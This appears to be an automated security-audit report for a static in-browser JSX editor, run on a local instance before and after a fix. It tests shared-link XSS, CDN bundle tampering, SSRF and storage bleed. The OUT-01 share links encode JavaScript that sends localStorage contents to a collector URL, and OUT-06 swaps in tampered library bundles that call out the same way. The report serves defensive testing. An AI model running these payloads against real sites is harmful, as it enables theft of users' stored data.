# C — after results

Generated: 2026-10-18T16:33:54.447Z

| ID | Attack | Applied | How it ran | Request | Response | Refused? |
|----|--------|---------|------------|---------|----------|----------|
| OUT-01 | XSS via shared #code= link: attacker JS executes at app origin (top window) with localStorage read | ✅ | Opened attacker share links (same encoding as the app Share button) in headless Firefox at the app origin. (01a) shared link whose code is the verbatim brief payload fetch(JSON.stringify(localStorage.keys + jsxpress:__draft)) with victim storage pre-seeded with hidden file jsxpress:f_secret/secret-thing.jsx; (01a-sentinel) shared link executing window.__pwnedTop=true; (01b) JSX vectors — the brief's literal text `<img src=x onerror=alert(1)>` AND the Babel-consumable form `<img src=x onerror={al | 01a leak link: http://127.0.0.1:8903/editor.html#code=eyJuIjoiaW5ub2NlbnQuanN4IiwiYyI6ImZldGNoKFwiaHR0cDovLzEyNy4wLjAuMTo4OTQzL2xlYWs/bGliPVwiK2VuY29kZVVSSUNvbXBvbmVudChKU09OLnN0cmluZ2lmeShPYmplY3Qua2V5cyhsb2NhbFN0b3JhZ2UpLmNvbmNhdChbbG9jYWxTdG9yYWdlLmdldEl0ZW0oXCJqc3hwcmVzczpfX2RyYWZ0XCIpfHxcIlwiXSkpKSkgOyBmdW5jdGlvbiBBcHAoKXtyZXR1cm4gbnVsbH0ifQ== ⏎ 01a-sentinel link: http://127.0.0.1:8903/editor.html#code=eyJuIjoic2VudGluZWwuanN4IiwiYyI6IndpbmRvdy5fX3B3bmVkVG9wPXRydWU7IGZ1bmN0aW9uIEFwcCgpe3Jld | — PRE-FIX (success, collector-proven; fix commit 2026-10-17T17:04:04+03:00): — ⏎ exact verbatim collector log line(s) with the exfiltrated localStorage: [{"ts":"2026-10-16T16:52:26.434Z","path":"/leak?lib=%5B%22jsxpress%3A__draft%22%2C%22jsxpress%3Af_secret%22%2C%22jsxpress%3Alayout%22%2C%22%7B%5C%22name%5C%22%3A%5C%22secret-thing.jsx%5C%22%2C%5C%22code%5C%22%3A%5C%22%2F%2FA-private-code-SECRET123%5C%22%2C%5C%22currentKey%5C%22%3Anull%7D%22%5D"},{"ts":"2026-10-16T16:56:05.206Z","path":"/leak?lib | YES |
| OUT-02 | Server-Side Request Forgery (SSRF) | — | Skip rule invoked per instruction. Statically scanned every first-party repo file (index.html, editor.html, manifest.json, README.md, assets/*.js\|css) for fetch(, XMLHttpRequest, import(, EventSource, WebSocket plus server-side/proxy primitives. No live probing was performed (no server exists to reach; no non-local target permitted). | grep across repo assets: fetch( / XMLHttpRequest / import( / EventSource / WebSocket / proxy / express / http.request / child_process | ZERO fetch/XMLHttpRequest/import()/EventSource/WebSocket occurrences in first-party site code — no URL-fetching primitive exists anywhere (client or server), so SSRF is not applicable. Full inventory: 0 total match(es) of any pattern; URL-loading-primitive matches=0. The only external URL references in HTML are static <script>/<link> CDN loads (see externalScriptAndCssSources in artifact) — browser-side static fetches of fixed library URLs, not URL-parameterized fetching. | no |
| OUT-03 | Cross-browser content bleed: visitor A private localStorage seed read by visitors B/C | ✅ | Three sequential, independent headless-Firefox instances (launch() per visitor, separate profiles). A seeded jsxpress:f_seed = {name:"secret-thing.jsx", code:"//A-private"} via page.evaluate on editor.html then closed. B opened editor.html fresh and enumerated localStorage. C opened A's share URL (makeShareLink encoding) in a fresh instance and enumerated storage. | A: http://127.0.0.1:8903/editor.html (seed) ; B: http://127.0.0.1:8903/editor.html (fresh) ; C: http://127.0.0.1:8903/editor.html#code=eyJuIjoic2VjcmV0LXRoaW5nLmpzeCIsImMiOiIvL0EtcHJpdmF0ZSJ9 | B sees A's secret: NO — absent from B storage. B storage keys: ["jsxpress:layout"] ⏎ C (share-URL path) storage still contains no jsxpress:f_seed key: YES (isolated). ⏎ C's editor DID display A's shared file (code "//A-private", filename "secret-thing.jsx"): YES — public by design, the payload travels inside the URL hash itself, not from shared storage. ⏎ Cookies set by the app: none (0, 0, 0 cookies on A/B/C). | YES |
| OUT-04 | Hosting-platform preview links without platform login | — | Static-inventory row (skip rule: there is no platform-authenticated preview boundary to bypass — the product is plain static files hosted on GitHub Pages per the repo's own README). Single grep of every href in index.html/editor.html for admin/preview/auth-restricted routes. No live probing performed. | grep hrefs in index.html + editor.html; quote README hosting claims | 23 href match(es) across HTML files; admin/preview/auth-restricted routes found: 0. The site exposes only: "./", "#features", "#templates", "#faq", "editor.html", "editor.html?template=<id>", and one external nav link "https://github.com" (index.html, target=_blank). | no |
| OUT-05 | Hidden AI features / prompt injection into LLM pipelines | — | Static proof (skip rule: the site has no AI/LLM feature to target). Grepped all first-party repo files for API-key literals (sk-…), apiKey, OPENAI, ANTHROPIC, llm, model identifiers, AI-SDK references, plus a word-boundary "ai" sweep; inventoried every <script> tag in HTML for SDK loads. No live probing. | greps: /sk-[A-Za-z0-9_-]{8,}/, /apiKey/i, /openai/i, /anthropic/i, /\bllm\b/i, /\b(gpt-\d\|claude-\|gemini\|mistral\|llama)\b/i, /\bai\b/i across index.html, editor.html, assets/*, manifest.json, README.md | Key/SDK/model matches: 0. \bai\b word matches: 0 (none found). <script> tags present in HTML: cdn.tailwindcss.com, cdnjs react 18.3.1 (x2 UMD), cdnjs babel-standalone 7.28.4, and first-party assets/templates.js + assets/editor.js (+ assets/home.js on index.html) only — no AI SDK script loads, no third-party API endpoints, no keys anywhere in the tree. | no |
| OUT-06 | Dependency supply-chain tampering (CDN trust): pre-fix zero SRI/CSP — tampered bundles executed; post-fix SRI blocks them | ✅ | Headless Firefox at app origin. page.route (page routes take precedence over the context fence for the same URL — reliable) intercepted the CDN script URLs the editor.html head loads, fulfilling them with attacker-authored JavaScript that preserves the app's expected globals. (06a) babel.min.js → minimal Babel{transform} stub + fetch(collector/leak?babel=compromised); share payload additionally fetch()s leak?userscript=via-tampered-babel through the editor run pipeline to prove the end-to-end ch | 06a fulfill target: **/babel.min.js* → results/before/c/out06-tampered-babel.js ; opened share link: http://127.0.0.1:8903/editor.html#code=eyJuIjoiZmxhZy5qc3giLCJjIjoiZmV0Y2goJ2h0dHA6Ly8xMjcuMC4wLjE6ODk0My9sZWFrP3VzZXJzY3JpcHQ9dmlhLXRhbXBlcmVkLWJhYmVsJyk7IGZ1bmN0aW9uIEFwcCgpe3JldHVybiBudWxsfSJ9 ⏎ 06b fulfill targets: **/react.production.min.js* + **/react-dom.production.min.js* → results/before/c/out06-tampered-react.js ; opened share link: http://127.0.0.1:8903/editor.html#code=eyJuIjoicmVhY3Q | — PRE-FIX (success, collector-proven; fix commit 2026-10-17T17:04:04+03:00): — ⏎ tampered Babel executed at app origin: YES — exact collector line(s): {"ts":"2026-10-16T16:53:17.072Z","method":"GET","path":"/leak?babel=compromised","body":""} ;; {"ts":"2026-10-16T16:57:01.446Z","method":"GET","path":"/leak?babel=compromised","body":""} ;; {"ts":"2026-10-17T13:16:15.150Z","method":"GET","path":"/leak?babel=compromised","body":""} ⏎ end-user payload then executed through the editor's own run pipel | YES |

## Full details

### OUT-01 — XSS via shared #code= link: attacker JS executes at app origin (top window) with localStorage read
Applied: true
Refused: true

How: Opened attacker share links (same encoding as the app Share button) in headless Firefox at the app origin. (01a) shared link whose code is the verbatim brief payload fetch(JSON.stringify(localStorage.keys + jsxpress:__draft)) with victim storage pre-seeded with hidden file jsxpress:f_secret/secret-thing.jsx; (01a-sentinel) shared link executing window.__pwnedTop=true; (01b) JSX vectors — the brief's literal text `<img src=x onerror=alert(1)>` AND the Babel-consumable form `<img src=x onerror={alert(1)}>`; (01c) filename field carried <img src=x onerror=…> payload; (01d) JS-comment and JSX-comment injection payloads. Sentinels via addInitScript BEFORE any page/app script. TIMELINE: this runner executed successfully against the pre-fix site (2026-10-16T16:52:26Z and 2026-10-17T13:15:28Z, collector-proven) and was re-executed post-fix (2026-10-18) after commit 6ef35a1ff28693d980f94a685dfa2dc2291b4b81 2026-10-17T17:04:04+03:00 security: sandbox user-code execution; SRI + strict CSP; input bounding. Both phases are recorded below; pre-fix artifacts were overwritten by the post-fix rerun, but the append-only collector log preserves the pre-fix proof verbatim.

Request: 01a leak link: http://127.0.0.1:8903/editor.html#code=eyJuIjoiaW5ub2NlbnQuanN4IiwiYyI6ImZldGNoKFwiaHR0cDovLzEyNy4wLjAuMTo4OTQzL2xlYWs/bGliPVwiK2VuY29kZVVSSUNvbXBvbmVudChKU09OLnN0cmluZ2lmeShPYmplY3Qua2V5cyhsb2NhbFN0b3JhZ2UpLmNvbmNhdChbbG9jYWxTdG9yYWdlLmdldEl0ZW0oXCJqc3hwcmVzczpfX2RyYWZ0XCIpfHxcIlwiXSkpKSkgOyBmdW5jdGlvbiBBcHAoKXtyZXR1cm4gbnVsbH0ifQ==
01a-sentinel link: http://127.0.0.1:8903/editor.html#code=eyJuIjoic2VudGluZWwuanN4IiwiYyI6IndpbmRvdy5fX3B3bmVkVG9wPXRydWU7IGZ1bmN0aW9uIEFwcCgpe3JldHVybiBudWxsfSJ9
01b alert links (unbraced literal | braces): http://127.0.0.1:8903/editor.html#code=eyJuIjoiaW5ub2NlbnQuanN4IiwiYyI6ImZ1bmN0aW9uIEFwcCgpe3JldHVybiA8ZGl2Lz59IDxpbWcgc3JjPXggb25lcnJvcj1hbGVydCgxKT4ifQ== | http://127.0.0.1:8903/editor.html#code=eyJuIjoiaW5ub2NlbnQuanN4IiwiYyI6ImZ1bmN0aW9uIEFwcCgpe3JldHVybiA8ZGl2Lz59IDxpbWcgc3JjPXggb25lcnJvcj17YWxlcnQoMSl9PiJ9
01c filename link: http://127.0.0.1:8903/editor.html#code=eyJuIjoiPGltZyBzcmM9eCBvbmVycm9yPXdpbmRvdy5fX3B3bmVkVG9wPTE+IiwiYyI6ImZ1bmN0aW9uIEFwcCgpe3JldHVybiA8ZGl2Pm9rPC9kaXY+fSJ9
01d comment links: http://127.0.0.1:8903/editor.html#code=eyJuIjoiY29tbWVudHMuanN4IiwiYyI6Ii8qIDxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD4gKi8gZnVuY3Rpb24gQXBwKCl7cmV0dXJuIG51bGx9In0= ; http://127.0.0.1:8903/editor.html#code=eyJuIjoiY29tbWVudHMuanN4IiwiYyI6ImZ1bmN0aW9uIEFwcCgpe3JldHVybiA8ZGl2PnsvKiA8aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoMSk+ICovfSBoaTwvZGl2Pn0ifQ==

Response: — PRE-FIX (success, collector-proven; fix commit 2026-10-17T17:04:04+03:00): —
exact verbatim collector log line(s) with the exfiltrated localStorage: [{"ts":"2026-10-16T16:52:26.434Z","path":"/leak?lib=%5B%22jsxpress%3A__draft%22%2C%22jsxpress%3Af_secret%22%2C%22jsxpress%3Alayout%22%2C%22%7B%5C%22name%5C%22%3A%5C%22secret-thing.jsx%5C%22%2C%5C%22code%5C%22%3A%5C%22%2F%2FA-private-code-SECRET123%5C%22%2C%5C%22currentKey%5C%22%3Anull%7D%22%5D"},{"ts":"2026-10-16T16:56:05.206Z","path":"/leak?lib=%5B%22jsxpress%3A__draft%22%2C%22jsxpress%3Af_secret%22%2C%22jsxpress%3Alayout%22%2C%22%7B%5C%22name%5C%22%3A%5C%22secret-thing.jsx%5C%22%2C%5C%22code%5C%22%3A%5C%22%2F%2FA-private-code-SECRET123%5C%22%2C%5C%22currentKey%5C%22%3Anull%7D%22%5D"},{"ts":"2026-10-17T13:15:28.813Z","path":"/leak?lib=%5B%22jsxpress%3A__draft%22%2C%22jsxpress%3Af_secret%22%2C%22jsxpress%3Alayout%22%2C%22%7B%5C%22name%5C%22%3A%5C%22secret-thing.jsx%5C%22%2C%5C%22code%5C%22%3A%5C%22%2F%2FA-private-code-SECRET123%5C%22%2C%5C%22currentKey%5C%22%3Anull%7D%22%5D"}]
decoded exfiltrated payload: "[\"jsxpress:__draft\",\"jsxpress:f_secret\",\"jsxpress:layout\",\"{\\\"name\\\":\\\"secret-thing.jsx\\\",\\\"code\\\":\\\"//A-private-code-SECRET123\\\",\\\"currentKey\\\":null}\"]"
pre-fix success verified: YES — payload read app-origin localStorage (jsxpress:f_secret keys + draft with secret-thing.jsx + SECRET123) and exfiltrated them to the attacker collector
pre-fix supply-chain companion (OUT-06 payload signatures fired pre-fix): leak?babel=compromised, leak?userscript=via-tampered-babel, leak?react=compromised — see collector lines in the same log file
— POST-FIX (current rerun, same payloads): —
(a) alert invoked: NO — braced-vector alerts=[]; fact: the brief's exact unbraced text does NOT transpile (compile error), preview body: "<pre style=\"margin:0;padding:24px;background:#fff5f3;color:#9a2520;font-family:ui-monospace,monospace;font-size:13px;line-height:1.55;white-space:pre-wrap;borde"
(b) top-window execution sentinel __pwnedTop set (current run): 01a-sentinel=NO; 01b=NO
(c) collector /leak requests received this run: 0 (payload code no longer reaches the collector post-fix — status during 01a: runtime error, preview body: "<pre style=\"margin:0;padding:24px;background:#fff5f3;color:#9a2520;font-family:ui-monospace,monospace;font-size:13px;line-height:1.55;white-")
(d) can payload read app-origin localStorage this run: NO as observed
(01c) filename vector current run: inert — rendered as <input> value / textContent
(01d) comment vectors current run: inert — Babel strips them (statuses running, zero alerts)
traffic classification: non-fenced requests observed across OUT-01 pages: none (every observed URL was 127.0.0.1 or an allowlisted CDN)

Note: Pre-fix (the brief's expected result): attack SUCCEEDED — three collector-verbatim sequences (2026-10-16T16:52:26Z, 2026-10-16T16:53:17–20Z for the OUT-06 companion payloads, 2026-10-17T13:15:28Z) show the shared-link payload executing at top origin with localStorage read of a hidden seeded file; share links are attacker-controlled JSON {n,c} decoded at load and executed via editor.js new Function(...) inside the top-level app origin (confirmed in git parent commit: assets/editor.js dispatched user code through NEW-FUNCTION in the top origin and editor.html loaded cdnjs scripts with no integrity attr and no CSP — see fixTimeline.preFix in out01-requests.json). Post-fix rerun (2026-10-18): same payloads now refused — user code is handed to a sandboxed iframe (sandbox="allow-scripts", no allow-same-origin) and the leaked request never fires; filename and comment vectors were inert in both phases. The mid-audit fix commit is outside this subagent's scope (this agent records only).

Proof: results/before/c/out01-requests.json, ../before/collector-8943.log

### OUT-02 — Server-Side Request Forgery (SSRF)
Applied: false
Refused: false

How: Skip rule invoked per instruction. Statically scanned every first-party repo file (index.html, editor.html, manifest.json, README.md, assets/*.js|css) for fetch(, XMLHttpRequest, import(, EventSource, WebSocket plus server-side/proxy primitives. No live probing was performed (no server exists to reach; no non-local target permitted).

Request: grep across repo assets: fetch( / XMLHttpRequest / import( / EventSource / WebSocket / proxy / express / http.request / child_process

Response: ZERO fetch/XMLHttpRequest/import()/EventSource/WebSocket occurrences in first-party site code — no URL-fetching primitive exists anywhere (client or server), so SSRF is not applicable. Full inventory: 0 total match(es) of any pattern; URL-loading-primitive matches=0. The only external URL references in HTML are static <script>/<link> CDN loads (see externalScriptAndCssSources in artifact) — browser-side static fetches of fixed library URLs, not URL-parameterized fetching.

Note: N/A by product shape: there is NO server (GitHub Pages-style static hosting) and no code path fetches a runtime-controlled URL server-side. The single exposed external URL in app markup is https://github.com (index.html nav link, opens in the visitor browser, not fetched server-side). Per instruction: "SKIP if no server-side URL fetching exists" — it does not exist.

Proof: results/before/c/out02-ssrf-scan.json

### OUT-03 — Cross-browser content bleed: visitor A private localStorage seed read by visitors B/C
Applied: true
Refused: true

How: Three sequential, independent headless-Firefox instances (launch() per visitor, separate profiles). A seeded jsxpress:f_seed = {name:"secret-thing.jsx", code:"//A-private"} via page.evaluate on editor.html then closed. B opened editor.html fresh and enumerated localStorage. C opened A's share URL (makeShareLink encoding) in a fresh instance and enumerated storage.

Request: A: http://127.0.0.1:8903/editor.html (seed) ; B: http://127.0.0.1:8903/editor.html (fresh) ; C: http://127.0.0.1:8903/editor.html#code=eyJuIjoic2VjcmV0LXRoaW5nLmpzeCIsImMiOiIvL0EtcHJpdmF0ZSJ9

Response: B sees A's secret: NO — absent from B storage. B storage keys: ["jsxpress:layout"]
C (share-URL path) storage still contains no jsxpress:f_seed key: YES (isolated).
C's editor DID display A's shared file (code "//A-private", filename "secret-thing.jsx"): YES — public by design, the payload travels inside the URL hash itself, not from shared storage.
Cookies set by the app: none (0, 0, 0 cookies on A/B/C).

Note: Factual: localStorage/cookies are profile-local; a separate browser instance reads nothing from another visitor's app storage — no cross-visit bleed. The share link itself makes file contents public BY DESIGN (base64 payload in the URL fragment; README line 87 states this). No cookies of any kind are set by the app (static site; no Set-Cookie server; validate via cookies arrays in artifact).

Proof: results/before/c/out03-bleed.json

### OUT-04 — Hosting-platform preview links without platform login
Applied: false
Refused: false

How: Static-inventory row (skip rule: there is no platform-authenticated preview boundary to bypass — the product is plain static files hosted on GitHub Pages per the repo's own README). Single grep of every href in index.html/editor.html for admin/preview/auth-restricted routes. No live probing performed.

Request: grep hrefs in index.html + editor.html; quote README hosting claims

Response: 23 href match(es) across HTML files; admin/preview/auth-restricted routes found: 0. The site exposes only: "./", "#features", "#templates", "#faq", "editor.html", "editor.html?template=<id>", and one external nav link "https://github.com" (index.html, target=_blank).

Note: N/A — no platform login/preview authentication exists in this product. README.md line 9, verbatim: "- **Static and self-hostable.** The entire product is a handful of HTML, CSS, and JS files. No backend, no database, no account system. Drop it on GitHub Pages, Cloudflare Pages, or any web host you control." README.md line 50, verbatim: "4. The site will be available at `https://<username>.github.io/jsx-live/` within a minute." Deployment is public static hosting; every file is equally public by design, so there is no authenticated preview boundary to test from inside the local test environment (and no such platform check can be exercised locally).

Proof: results/before/c/out04-href-inventory.json

### OUT-05 — Hidden AI features / prompt injection into LLM pipelines
Applied: false
Refused: false

How: Static proof (skip rule: the site has no AI/LLM feature to target). Grepped all first-party repo files for API-key literals (sk-…), apiKey, OPENAI, ANTHROPIC, llm, model identifiers, AI-SDK references, plus a word-boundary "ai" sweep; inventoried every <script> tag in HTML for SDK loads. No live probing.

Request: greps: /sk-[A-Za-z0-9_-]{8,}/, /apiKey/i, /openai/i, /anthropic/i, /\bllm\b/i, /\b(gpt-\d|claude-|gemini|mistral|llama)\b/i, /\bai\b/i across index.html, editor.html, assets/*, manifest.json, README.md

Response: Key/SDK/model matches: 0. \bai\b word matches: 0 (none found). <script> tags present in HTML: cdn.tailwindcss.com, cdnjs react 18.3.1 (x2 UMD), cdnjs babel-standalone 7.28.4, and first-party assets/templates.js + assets/editor.js (+ assets/home.js on index.html) only — no AI SDK script loads, no third-party API endpoints, no keys anywhere in the tree.

Note: N/A by product shape: no AI/LLM feature exists (README "How It Works": Babel in-browser + React 18 + localStorage only). There is therefore no agentic preview/AI-egress boundary to inject into. Facts recorded so the fixer can re-verify: zero API keys, zero AI SDK scripts, zero fetch() in first-party code (cross-ref OUT-02 inventory).

Proof: results/before/c/out05-ai-feature-grep.json

### OUT-06 — Dependency supply-chain tampering (CDN trust): pre-fix zero SRI/CSP — tampered bundles executed; post-fix SRI blocks them
Applied: true
Refused: true

How: Headless Firefox at app origin. page.route (page routes take precedence over the context fence for the same URL — reliable) intercepted the CDN script URLs the editor.html head loads, fulfilling them with attacker-authored JavaScript that preserves the app's expected globals. (06a) babel.min.js → minimal Babel{transform} stub + fetch(collector/leak?babel=compromised); share payload additionally fetch()s leak?userscript=via-tampered-babel through the editor run pipeline to prove the end-to-end chain. (06b) react.production.min.js + react-dom.production.min.js → React/ReactDOM stubs whose createRoot calls fetch(collector/leak?react=compromised) and renders a TAMPERED-REACT-EXECUTED marker; real Babel left in place. TIMELINE: ran successfully against the pre-fix site (2026-10-16T16:53Z, collector-proven; identical signatures recorded again 2026-10-17T13:16Z) and was re-run post-fix 2026-10-18 after commit 6ef35a1ff28693d980f94a685dfa2dc2291b4b81 2026-10-17T17:04:04+03:00 security: sandbox user-code execution; SRI + strict CSP; input bounding. Pre-fix static state (git parent commit, read-only introspection): integrity attributes in editor.html=0, CSP meta=false, new-Function top-origin pipeline=true. Current state: integrity attrs=1, CSP meta=true, sandboxed iframe=true.

Request: 06a fulfill target: **/babel.min.js* → results/before/c/out06-tampered-babel.js ; opened share link: http://127.0.0.1:8903/editor.html#code=eyJuIjoiZmxhZy5qc3giLCJjIjoiZmV0Y2goJ2h0dHA6Ly8xMjcuMC4wLjE6ODk0My9sZWFrP3VzZXJzY3JpcHQ9dmlhLXRhbXBlcmVkLWJhYmVsJyk7IGZ1bmN0aW9uIEFwcCgpe3JldHVybiBudWxsfSJ9
06b fulfill targets: **/react.production.min.js* + **/react-dom.production.min.js* → results/before/c/out06-tampered-react.js ; opened share link: http://127.0.0.1:8903/editor.html#code=eyJuIjoicmVhY3QtdGFtcGVyLmpzeCIsImMiOiJmdW5jdGlvbiBBcHAoKXtyZXR1cm4gPGRpdiBzdHlsZT17e3BhZGRpbmc6MjR9fT50YW1wZXIgZGVtbzwvZGl2Pn0ifQ==

Response: — PRE-FIX (success, collector-proven; fix commit 2026-10-17T17:04:04+03:00): —
tampered Babel executed at app origin: YES — exact collector line(s): {"ts":"2026-10-16T16:53:17.072Z","method":"GET","path":"/leak?babel=compromised","body":""} ;; {"ts":"2026-10-16T16:57:01.446Z","method":"GET","path":"/leak?babel=compromised","body":""} ;; {"ts":"2026-10-17T13:16:15.150Z","method":"GET","path":"/leak?babel=compromised","body":""}
end-user payload then executed through the editor's own run pipeline: YES — exact line(s): {"ts":"2026-10-16T16:53:17.348Z","method":"GET","path":"/leak?userscript=via-tampered-babel","body":""} ;; {"ts":"2026-10-16T16:57:01.722Z","method":"GET","path":"/leak?userscript=via-tampered-babel","body":""} ;; {"ts":"2026-10-17T13:16:15.425Z","method":"GET","path":"/leak?userscript=via-tampered-babel","body":""}
tampered React/ReactDOM executed: YES — exact line(s): {"ts":"2026-10-16T16:53:20.824Z","method":"GET","path":"/leak?react=compromised","body":""} ;; {"ts":"2026-10-16T16:57:05.334Z","method":"GET","path":"/leak?react=compromised","body":""} ;; {"ts":"2026-10-17T13:16:18.858Z","method":"GET","path":"/leak?react=compromised","body":""}
— POST-FIX (current rerun with identical tampered bundles): —
(06a) tampered Babel executed: NO — __tamperedBabel=false, status=libs missing; SRI refusal captured by Firefox: "[JavaScript Error: \"None of the “sha384” hashes in the integrity attribute match the content of the subresource at “https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/7.28.4/babel.min.js”. The computed hash is “IKXU8VSDFnb9YhsoHzVRMsy1ryHj0qlGo1xQEVkZBqCccivbtGhXFcud1kvYruyv”.\" {file: \"http://127.0.0.1:8903/ed
(06a) end-user payload executed: NO — collector: 0
(06b) tampered React/ReactDOM executed: NO — flags=false/false, status=runtime error
current-run /leak lines: babel=0, userscript=0, react=0
non-fenced requests this run: none (127.0.0.1 + allowlisted CDNs only)

Note: Post-fix refusal is enforced by SRI (editor.html now pins sha384 hashes on the cdnjs scripts and Firefox rejects the tampered bundle before execution — refusal text captured in sriRefusalConsoleLines) plus a strict CSP meta (default-src none; script-src self+cdnjs). PRE-FIX the same page trusted its CDN scripts blindly: the identical tampered-request traces executed at app origin and called out to the collector (verbatim lines above), consistent with the parent commit carrying no integrity attributes and no CSP. Combined with OUT-01's pre-fix top-origin execution, a CDN compromise pre-fix upgraded directly to first-party XSS with localStorage access.

Proof: results/before/c/out06-requests.json, results/before/c/out06-tampered-babel.js, results/before/c/out06-tampered-react.js, results/before/c/out06-sri-csp-scan.json, ../before/collector-8943.log

## Artifacts

- results/after/c/out01-requests.json.txt
- results/after/c/out02-ssrf-scan.json.txt
- results/after/c/out03-bleed.json.txt
- results/after/c/out04-href-inventory.json.txt
- results/after/c/out05-ai-feature-grep.json.txt
- results/after/c/out06-sri-csp-scan.json.txt
- results/after/c/out06-tampered-babel.js.txt
- results/after/c/out06-tampered-react.js.txt
- results/after/c/out06-requests.json.txt
- results/after/c/out-collector-log-full.txt
